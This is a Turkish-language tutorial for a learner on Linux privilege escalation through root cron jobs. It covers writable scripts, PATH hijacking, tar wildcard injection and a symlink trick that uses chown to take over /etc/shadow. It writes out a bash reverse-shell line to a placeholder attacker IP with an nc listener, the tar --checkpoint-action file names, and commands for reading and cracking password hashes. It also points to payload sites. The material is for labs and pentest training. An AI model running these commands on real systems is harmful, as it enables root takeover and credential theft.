1.  **Yazma İznimiz Olan Betikler (Writable Scripts):** `root` kullanıcısı tarafından periyodik olarak çalıştırılan bir betiğe (`.sh` dosyası gibi) eğer biz yazma yetkisine sahipsek, betiğin içeriğini kendi zararlı kodumuzla değiştirerek `root` yetkileriyle komut çalıştırabiliriz.
2.  **PATH Zafiyeti (PATH Hijacking):** `root` tarafından çalıştırılan bir cron job, çalıştıracağı betiğin tam yolunu (`/usr/bin/script.sh` gibi) belirtmek yerine sadece ismini (`script.sh` gibi) kullanıyorsa, sistem bu betiği `PATH` değişkeninde tanımlı klasörlerde sırayla arar. Eğer `PATH` sıralamasında, betiğin orijinal konumundan önce gelen ve bizim yazma yetkimizin olduğu bir klasör varsa (örneğin `/tmp/` veya kendi `home` dizinimiz), oraya aynı isimde kendi betiğimizi koyarak orijinal betik yerine bizim betiğimizin `root` yetkilerinde çalışmasını sağlayabiliriz.

Bu iki senaryo, konunun özünü mükemmel bir şekilde özetliyor. Şimdi bu temelin üzerine yeni katlar çıkalım.

* * *

### 1\. Konuyu Derinleştirelim: Wildcard Injection (Joker Karakterler)

TryHackMe dersinin sonunda bahsettiği "wildcard" konusu çok kritiktir ve genellikle gözden kaçar. Bazı cron job'lar, belirli bir klasördeki tüm dosyaları işlemek için `*` (wildcard) karakterini kullanır. Örneğin, yedekleme yapan bir betik düşünelim:

Bash

```
# /usr/local/bin/backup.sh
cd /home/user/uploads/
tar -czf /var/backups/upload_backup.tar.gz *
```

Bu betik `root` tarafından her saat başı çalıştırılıyor olsun. `tar` komutu, `*` karakteri sayesinde `/home/user/uploads/` içindeki tüm dosyaları yedeklemeye çalışır. Buradaki zafiyet, `tar` gibi komutların dosya isimlerini aynı zamanda komut parametresi olarak yorumlayabilmesidir.

Eğer `/home/user/uploads/` klasörüne yazma yetkimiz varsa, bu durumu sömürebiliriz.

**Zafiyetin Sömürülmesi:**

`tar` komutunun `--checkpoint-action=exec=SHELL_COMMAND` gibi pek bilinmeyen ama güçlü bir parametresi vardır. Bu parametre, `tar`'ın belirli aralıklarla bir komut çalıştırmasını sağlar.

1.  **Saldırı Hazırlığı (Kendi Makinemizde):** Listener (dinleyici) açalım:
    
    Bash
    
    ```
    nc -lvnp 4444
    ```
    
2.  **Hedef Sistemde:** `/home/user/uploads/` klasörüne gidip aşağıdaki dosyaları oluşturalım:
    
    Bash
    
    ```
    cd /home/user/uploads/
    
    # Ters kabuk (reverse shell) almamızı sağlayacak komutu bir dosyaya yazıyoruz.
    # Hedefte bash varsa bu payload genellikle çalışır.
    echo 'bash -i >& /dev/tcp/SENIN_IP_ADRESIN/4444 0>&1' > shell.sh
    
    # tar komutunun bu dosyaları parametre olarak algılamasını sağlıyoruz.
    touch './--checkpoint-action=exec=sh shell.sh'
    touch './--checkpoint=1'
    ```
    

**Ne Oldu?** Cron job çalıştığında, `tar -czf ... *` komutu `*`'ı genişletecek ve dosya listesinde bizim oluşturduğumuz `./--checkpoint-action=...` ve `./--checkpoint=1` dosyalarını görecektir. `tar`, bu isimleri dosya olarak değil, kendisine verilmiş parametreler olarak yorumlayacak ve `shell.sh` betiğini çalıştıracaktır. Bu betik `root` tarafından çalıştırıldığı için, listener'ımıza `root` yetkilerinde bir shell düşecektir.

* * *

### 2\. Gelişim Seviyene Uygun Kaynaklar

Bu konuları pekiştirmek ve yenilerini öğrenmek için aşağıdaki kaynakları şiddetle tavsiye ederim:

- **Laboratuvarlar (Labs):**
    
    - **TryHackMe:** Henüz tamamlamadıysan "Linux PrivEsc" odasını kesinlikle bitirmelisin. Orada cron job'lar, SUID bitleri, kernel exploitleri gibi birçok vektör pratik olarak işleniyor.
    - **Hack The Box:** Artık kendini bir sonraki seviyeye taşımanın zamanı gelmiş olabilir. HTB'deki makineler, daha gerçekçi ve karmaşık senaryolar sunar.
    - **VulnHub:** Çevrimdışı çalışabileceğin, zafiyetli sanal makineler barındırır. "Kioptrix" serisi veya "Stapler" gibi makinelerle başlayabilirsin.
- **Web Siteleri ve Repolar:**
    
    - **GTFOBins:** Bu site senin kutsal kitabın olmalı. Bir Linux komutunun (binary) yetki yükseltme, dosya okuma/yazma veya shell alma gibi amaçlarla nasıl kötüye kullanılabileceğini gösteren bir referans kaynağıdır. Adres: https://gtfobins.github.io/
    - **PayloadsAllTheThings:** Adı üzerinde, aklına gelebilecek her türlü payload'u barındıran devasa bir GitHub reposu. Özellikle "Privilege Escalation" bölümü çok değerli. Adres: https://github.com/swisskyrepo/PayloadsAllTheThings
    - **RevShells.com:** Farklı sistem ve diller için (Bash, Python, Perl, nc, etc.) anında reverse shell payload'ları üreten pratik bir site.

* * *

### 3\. Pratik Senaryo: Adım Adım Pentest

Farz edelim ki bir sisteme `www-data` kullanıcısı olarak sızdın ve yetkini `root`'a yükseltmek istiyorsun.

**Adım 1: Keşif (Enumeration)** İlk işin her zaman sistemde neler olup bittiğini anlamaktır. Cron job'ları arayarak başlayalım.

- Sistem genelindeki cron job'ları kontrol et:
    
    Bash
    
    ```
    cat /etc/crontab
    ls -la /etc/cron.d/
    ```
    
    Diyelim ki `/etc/crontab` dosyasında şöyle bir satır gördün:
    
    ```
    */5 * * * * root    /opt/scripts/monitor.sh
    ```
    
    Bu, her 5 dakikada bir `root` kullanıcısının `/opt/scripts/monitor.sh` betiğini çalıştırdığı anlamına gelir.
    
- Manuel kontrole ek olarak, `pspy` gibi araçlar kullanarak sistemdeki işlemleri anlık olarak izleyebilirsin. `pspy`, cron job'ların ne zaman çalıştığını ve hangi komutları yürüttüğünü görmenin en etkili yollarından biridir.
    

**Adım 2: Zafiyet Analizi** Şimdi bulduğumuz `monitor.sh` betiğini ve bulunduğu dizini inceleyelim.

- Betiğin izinlerini kontrol et:
    
    Bash
    
    ```
    ls -l /opt/scripts/monitor.sh
    ```
    
    Çıktı: `-rwxr-xr-x 1 root root 58 Jun 10 14:25 /opt/scripts/monitor.sh` Gördüğün gibi, sahibi `root` ve sadece `root` yazma iznine sahip. Buradan bir şey çıkmaz.
    
- Betiğin bulunduğu dizinin izinlerini kontrol et:
    
    Bash
    
    ```
    ls -ld /opt/scripts/
    ```
    
    Çıktı: `drwxr-xr-x 2 root root 4096 Jun 10 14:25 /opt/scripts/` Bu dizine de sadece `root` yazabilir.
    
- Peki, betiğin içeriği ne?
    
    Bash
    
    ```
    cat /opt/scripts/monitor.sh
    ```
    
    İçerik:
    
    Bash
    
    ```
    #!/bin/bash
    cd /var/log/apache2
    /usr/bin/chown www-data:www-data *.log
    ```
    
    Aha! Bu betik, Apache loglarının bulunduğu dizine gidip oradaki tüm `.log` uzantılı dosyaların sahibini `www-data` yapıyor. `chown` komutu wildcard (`*`) kullanmıyor gibi görünse de, `*.log` ifadesi de kabuk (shell) tarafından genişletilir ve bu da bir wildcard zafiyetine yol açabilir! Ama burada daha basit bir yol var: **log dosyası oluşturma**.
    
    Biz `www-data` kullanıcısıyız ve `/var/log/apache2` dizinine yazma yetkimiz var. `chown` komutu, sembolik linkleri (symlink) takip eder.
    

**Adım 3: Zafiyeti Sömürme (Exploitation)**

1.  `/var/log/apache2` dizinine git:
    
    Bash
    
    ```
    cd /var/log/apache2
    ```
    
2.  `root` kullanıcısının şifrelerinin hash'ini içeren `/etc/shadow` dosyasına işaret eden bir sembolik link oluştur. Dosya adının `.log` ile bitmesi önemli.
    
    Bash
    
    ```
    ln -s /etc/shadow exploit.log
    ```
    
3.  Şimdi cron job'un çalışmasını bekle (en fazla 5 dakika). Cron job çalıştığında `/opt/scripts/monitor.sh` betiği de çalışacak ve şu komutu yürütecektir: `/usr/bin/chown www-data:www-data *.log`. Kabuk, `*.log` ifadesini genişlettiğinde `exploit.log` dosyasını bulacak. `chown` komutu da bu sembolik linki takip ederek orijinal dosyanın, yani `/etc/shadow` dosyasının sahibini `www-data` olarak değiştirecek!
    
4.  Kontrol et:
    
    Bash
    
    ```
    ls -l /etc/shadow
    ```
    
    Çıktı: `-rw-r----- 1 www-data www-data 1058 May 29 11:00 /etc/shadow` Artık `/etc/shadow` dosyasını okuyabiliriz!
    
5.  Dosyayı oku ve `root` kullanıcısının parolasını `john` veya `hashcat` ile kırmaya çalış.
    
    Bash
    
    ```
    cat /etc/shadow
    ```
    

* * *

### 4\. Geri Bildirim ve Sık Yapılan Hatalar

- **Yanlış Reverse Shell Payload'u:** TryHackMe'de sıkça kullanılan `nc -e /bin/bash` komutu, modern sistemlerin çoğunda çalışmaz. `nc`'nin `-e` opsiyonu genellikle derleme dışı bırakılır. Yukarıda gösterdiğim `bash -i >& ...` gibi daha evrensel payload'ları kullanmaya alış.
- **PATH Zafiyetinde Yanlış Dizin:** Bir PATH zafiyetini sömürürken, oluşturduğun sahte betiği `/tmp` gibi herkesin yazabildiği bir dizine koymak akıllıcadır. `PATH` değişkenini `echo $PATH` ile kontrol etmeyi ve dizinlerin sırasına dikkat etmeyi unutma.
- **İzleri Temizlememek:** Gerçek bir pentestte, yetki yükselttikten sonra sisteme yüklediğin betikleri, oluşturduğun dosyaları (`exploit.log`, `--checkpoint` dosyaları vb.) silerek arkanda iz bırakmamalısın.